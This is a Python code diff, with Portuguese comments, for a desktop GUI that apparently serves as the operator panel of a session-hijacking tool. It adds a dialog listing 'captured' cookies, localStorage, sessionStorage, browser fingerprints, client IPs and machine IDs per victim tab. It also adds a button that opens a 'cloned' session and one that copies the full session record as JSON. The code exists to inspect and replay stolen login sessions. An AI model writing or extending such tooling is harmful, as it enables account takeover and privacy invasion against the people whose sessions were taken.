@@ -1837,41 +1837,70 @@ class MainWindow(ctk.CTk):
             )
             status_badge.pack(side="right")
             
-            # ✅ BOTÃO ABRIR SESSÃO
+            # ✅ BOTÕES DE AÇÃO (apenas se ativa)
             if is_active:
-                btn_frame = ctk.CTkFrame(content, fg_color="transparent")
-                btn_frame.pack(fill="x", pady=(10, 0))
+                actions_frame = ctk.CTkFrame(content, fg_color="transparent")
+                actions_frame.pack(fill="x", pady=(10, 0))
+                
+                # Verificar dados disponíveis
+                cookies = session.get('cookies', [])
+                local_storage = session.get('local_storage', {})
+                session_storage = session.get('session_storage', {})
+                fingerprint = session.get('browser_fingerprint')
+                
+                has_cookies = len(cookies) > 0
+                has_storage = len(local_storage) > 0 or len(session_storage) > 0
+                has_fingerprint = fingerprint is not None
+                can_clone = has_cookies and has_fingerprint
+                
+                # Botão Abrir Sessão
+                open_btn_text = "🚀 Abrir Sessão" if can_clone else "⚠️ Dados Insuficientes"
+                open_btn_color = "#10b981" if can_clone else "#64748b"
                 
                 open_session_btn = ctk.CTkButton(
-                    btn_frame,
-                    text="🚀 Abrir Sessão",
+                    actions_frame,
+                    text=open_btn_text,
                     width=150,
+                    height=32,
+                    fg_color=open_btn_color,
+                    hover_color="#059669" if can_clone else "#475569",
+                    font=ctk.CTkFont(size=12, weight="bold"),
+                    state="normal" if can_clone else "disabled",
+                    command=lambda s=session: self.open_cloned_session(s)
+                )
+                open_session_btn.pack(side="left", padx=(0, 8))
+                
+                # Botão Ver Dados
+                view_data_btn = ctk.CTkButton(
+                    actions_frame,
+                    text="📊 Ver Dados",
+                    width=120,
                     height=32,
                     fg_color="#2563eb",
                     hover_color="#1d4ed8",
-                    font=ctk.CTkFont(size=12, weight="bold"),
-                    command=lambda s=session: self.open_cloned_session(s)
+                    font=ctk.CTkFont(size=12),
+                    command=lambda s=session: self.show_session_data_details(s)
                 )
-                open_session_btn.pack(side="left")
+                view_data_btn.pack(side="left", padx=(0, 8))
                 
-                # Indicador de dados disponíveis
-                cookies_count = len(session.get('cookies', []))
-                storage_count = len(session.get('local_storage', {}))
-                has_fingerprint = bool(session.get('browser_fingerprint'))
-                
-                data_info = f"📦 {cookies_count} cookies"
-                if storage_count > 0:
-                    data_info += f" · 💾 {storage_count} storage items"
+                # Indicador de dados (lado direito)
+                data_info_parts = []
+                if has_cookies:
+                    data_info_parts.append(f"🍪 {len(cookies)}")
+                if has_storage:
+                    storage_count = len(local_storage) + len(session_storage)
+                    data_info_parts.append(f"💾 {storage_count}")
                 if has_fingerprint:
-                    data_info += " · 🔍 fingerprint"
+                    data_info_parts.append("🔍")
                 
-                info_label = ctk.CTkLabel(
-                    btn_frame,
-                    text=data_info,
-                    font=ctk.CTkFont(size=10),
-                    text_color="#94a3b8"
-                )
-                info_label.pack(side="left", padx=(15, 0))
+                if data_info_parts:
+                    data_info_label = ctk.CTkLabel(
+                        actions_frame,
+                        text=" · ".join(data_info_parts),
+                        font=ctk.CTkFont(size=11),
+                        text_color="#94a3b8"
+                    )
+                    data_info_label.pack(side="right", padx=(10, 0))
         
         search_btn = ctk.CTkButton(
             search_frame,
@@ -2009,6 +2038,214 @@ class MainWindow(ctk.CTk):
         ctk.CTkLabel(
             frame,
             text="⚠️",
+            font=ctk.CTkFont(size=32)
+        ).pack(pady=(10, 10))
+        
+        ctk.CTkLabel(
+            frame,
+            text=message,
+            font=ctk.CTkFont(size=12),
+            wraplength=350
+        ).pack(pady=(0, 20))
+        
+        ctk.CTkButton(
+            frame,
+            text="OK",
+            width=100,
+            command=dialog.destroy
+        ).pack()
+    
+    def show_session_data_details(self, session: Dict):
+        """Mostrar detalhes completos dos dados da sessão"""
+        logger.info(f"📊 Exibindo detalhes da sessão: {session['domain']}")
+        
+        dialog = ctk.CTkToplevel(self)
+        dialog.title(f"Dados da Sessão - {session['domain']}")
+        dialog.geometry("800x600")
+        dialog.transient(self)
+        dialog.grab_set()
+        
+        # Centralizar
+        dialog.update_idletasks()
+        x = (dialog.winfo_screenwidth() // 2) - 400
+        y = (dialog.winfo_screenheight() // 2) - 300
+        dialog.geometry(f"800x600+{x}+{y}")
+        
+        # Frame principal
+        main_frame = ctk.CTkFrame(dialog, fg_color="transparent")
+        main_frame.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        # Header
+        header = ctk.CTkFrame(main_frame, fg_color="transparent")
+        header.pack(fill="x", pady=(0, 15))
+        
+        ctk.CTkLabel(
+            header,
+            text=f"🔍 Dados Capturados - {session['domain']}",
+            font=ctk.CTkFont(size=16, weight="bold")
+        ).pack(side="left")
+        
+        # Tabs
+        tabview = ctk.CTkTabview(main_frame)
+        tabview.pack(fill="both", expand=True)
+        
+        # Tab Resumo
+        tab_resumo = tabview.add("📋 Resumo")
+        scroll_resumo = ctk.CTkScrollableFrame(tab_resumo)
+        scroll_resumo.pack(fill="both", expand=True)
+        
+        cookies = session.get('cookies', [])
+        local_storage = session.get('local_storage', {})
+        session_storage = session.get('session_storage', {})
+        fingerprint = session.get('browser_fingerprint', {})
+        
+        info_text = f"""
+🌐 URL: {session['url']}
+📛 Domínio: {session['domain']}
+🆔 Tab ID: {session['tab_id']}
+🖥️ Machine ID: {session['machine_id']}
+
+🍪 Cookies: {len(cookies)}
+💾 LocalStorage: {len(local_storage)} items
+💾 SessionStorage: {len(session_storage)} items
+🔍 Fingerprint: {'✅ Disponível' if fingerprint else '❌ Não capturado'}
+🌍 IP Cliente: {session.get('client_ip', 'Não disponível')}
+
+⏰ Última Atividade: {session.get('last_activity', 'Desconhecido')}
+🟢 Status: {'Ativa' if session.get('is_active') else 'Inativa'}
+        """
+        
+        ctk.CTkLabel(
+            scroll_resumo,
+            text=info_text,
+            font=ctk.CTkFont(size=12),
+            justify="left"
+        ).pack(anchor="w", pady=10)
+        
+        # Tab Cookies
+        tab_cookies = tabview.add(f"🍪 Cookies ({len(cookies)})")
+        scroll_cookies = ctk.CTkScrollableFrame(tab_cookies)
+        scroll_cookies.pack(fill="both", expand=True)
+        
+        if cookies:
+            for i, cookie in enumerate(cookies[:50]):  # Mostrar primeiros 50
+                cookie_frame = ctk.CTkFrame(scroll_cookies, fg_color="#1e293b")
+                cookie_frame.pack(fill="x", pady=2, padx=5)
+                
+                cookie_text = f"{cookie.get('name', 'unknown')}: {cookie.get('value', '')[:50]}..."
+                ctk.CTkLabel(
+                    cookie_frame,
+                    text=cookie_text,
+                    font=ctk.CTkFont(size=10)
+                ).pack(anchor="w", padx=10, pady=5)
+        else:
+            ctk.CTkLabel(
+                scroll_cookies,
+                text="Nenhum cookie capturado",
+                text_color="gray"
+            ).pack(pady=20)
+        
+        # Tab Storage
+        tab_storage = tabview.add(f"💾 Storage ({len(local_storage) + len(session_storage)})")
+        scroll_storage = ctk.CTkScrollableFrame(tab_storage)
+        scroll_storage.pack(fill="both", expand=True)
+        
+        if local_storage:
+            ctk.CTkLabel(
+                scroll_storage,
+                text="LocalStorage:",
+                font=ctk.CTkFont(size=12, weight="bold")
+            ).pack(anchor="w", pady=(5, 2))
+            
+            for key, value in list(local_storage.items())[:20]:
+                storage_frame = ctk.CTkFrame(scroll_storage, fg_color="#1e293b")
+                storage_frame.pack(fill="x", pady=2, padx=5)
+                
+                ctk.CTkLabel(
+                    storage_frame,
+                    text=f"{key}: {str(value)[:100]}...",
+                    font=ctk.CTkFont(size=10)
+                ).pack(anchor="w", padx=10, pady=5)
+        
+        if session_storage:
+            ctk.CTkLabel(
+                scroll_storage,
+                text="SessionStorage:",
+                font=ctk.CTkFont(size=12, weight="bold")
+            ).pack(anchor="w", pady=(15, 2))
+            
+            for key, value in list(session_storage.items())[:20]:
+                storage_frame = ctk.CTkFrame(scroll_storage, fg_color="#1e293b")
+                storage_frame.pack(fill="x", pady=2, padx=5)
+                
+                ctk.CTkLabel(
+                    storage_frame,
+                    text=f"{key}: {str(value)[:100]}...",
+                    font=ctk.CTkFont(size=10)
+                ).pack(anchor="w", padx=10, pady=5)
+        
+        if not local_storage and not session_storage:
+            ctk.CTkLabel(
+                scroll_storage,
+                text="Nenhum storage capturado",
+                text_color="gray"
+            ).pack(pady=20)
+        
+        # Botões
+        btn_frame = ctk.CTkFrame(main_frame, fg_color="transparent")
+        btn_frame.pack(fill="x", pady=(15, 0))
+        
+        ctk.CTkButton(
+            btn_frame,
+            text="📋 Copiar JSON",
+            width=120,
+            command=lambda: self.copy_session_json(session)
+        ).pack(side="left", padx=(0, 10))
+        
+        ctk.CTkButton(
+            btn_frame,
+            text="❌ Fechar",
+            width=100,
+            command=dialog.destroy
+        ).pack(side="right")
+    
+    def copy_session_json(self, session: Dict):
+        """Copiar dados da sessão como JSON"""
+        import json
+        import pyperclip
+        
+        try:
+            json_data = json.dumps(session, indent=2, default=str)
+            pyperclip.copy(json_data)
+            logger.info("✅ JSON copiado para clipboard")
+            
+            # Mostrar feedback
+            self.show_success_dialog("Sucesso", "Dados copiados para a área de transferência!")
+        except Exception as e:
+            logger.error(f"❌ Erro ao copiar JSON: {e}", exc_info=True)
+            self.show_error_dialog("Erro", f"Não foi possível copiar:\n{str(e)}")
+    
+    def show_success_dialog(self, title: str, message: str):
+        """Mostrar diálogo de sucesso"""
+        dialog = ctk.CTkToplevel(self)
+        dialog.title(title)
+        dialog.geometry("400x200")
+        dialog.transient(self)
+        dialog.grab_set()
+        
+        # Centralizar
+        dialog.update_idletasks()
+        x = (dialog.winfo_screenwidth() // 2) - 200
+        y = (dialog.winfo_screenheight() // 2) - 100
+        dialog.geometry(f"400x200+{x}+{y}")
+        
+        # Conteúdo
+        frame = ctk.CTkFrame(dialog, fg_color="transparent")
+        frame.pack(fill="both", expand=True, padx=20, pady=20)
+        
+        ctk.CTkLabel(
+            frame,
+            text="✅",
             font=ctk.CTkFont(size=32)
         ).pack(pady=(10, 10))
         
